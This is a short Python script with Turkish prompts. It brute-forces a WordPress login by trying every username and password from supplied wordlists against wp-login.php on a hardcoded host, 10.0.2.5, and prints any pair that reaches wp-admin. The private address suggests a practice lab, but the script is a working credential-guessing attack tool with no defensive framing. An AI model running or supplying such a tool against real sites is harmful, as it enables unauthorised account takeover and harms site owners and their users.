#!/usr/bin/python
# -*- coding: utf-8 -*-

import mechanize
import optparse


def user_input():
    parse = optparse.OptionParser()
    parse.add_option("-U", "--usernames", dest="dosya_user", help="username list")
    parse.add_option("-P", "--passwords", dest="dosya_pass", help="password list")
    parse.add_option("-u", "--username", dest="username", help="login page username field")
    parse.add_option("-p", "--password", dest="password", help="login page password field")
    options = parse.parse_args()[0]
    if not (options.dosya_user):
        print("username dosyasını girin")
    if not (options.dosya_pass):
        print("password dosyasını girin")
    if not (options.username):
        print("login page username source-code:name girin")
    if not (options.password):
        print("login page password source-code:name girin")

    return options


def perc_hesap(adet):
    global sayac
    sayac += 1
    yuzde = int(((adet - sayac) / adet) * 100)
    print("\r%{} tamamlandı".format(yuzde), end="")


user_inputs = user_input()

dosya_user = open(user_inputs.dosya_user, "r")
dosya_user = dosya_user.readlines()

dosya_pass = open(user_inputs.dosya_pass, "r")
dosya_pass = dosya_pass.readlines()

sayac = 0
percent = len(dosya_user) * len(dosya_pass)


def main():
    for user in dosya_user:
        for passwd in dosya_pass:
            browser = mechanize.Browser()
            browser.open("http://10.0.2.5/wp-login.php")
            login_title = browser.title()
            browser.select_form(nr=0)
            browser.form[user_inputs.username] = user
            browser.form[user_inputs.password] = passwd
            browser.submit()
            browser.open("http://10.0.2.5/wp-admin").read()
            result_title = browser.title()
            if (result_title != login_title):
                secim = input("\ndoğrulama yapıldı, denemeye devam etmek ister misin? (y/N) ")
                if (secim == "y" or secim == "Y"):
                    print("username = {} --> password = {}".format(user, passwd))
                else:
                    print("username = {} --> password = {}".format(user, passwd))
                    break
            browser.close()
            perc_hesap(percent)


if (__name__ == "__main__"):
    main()
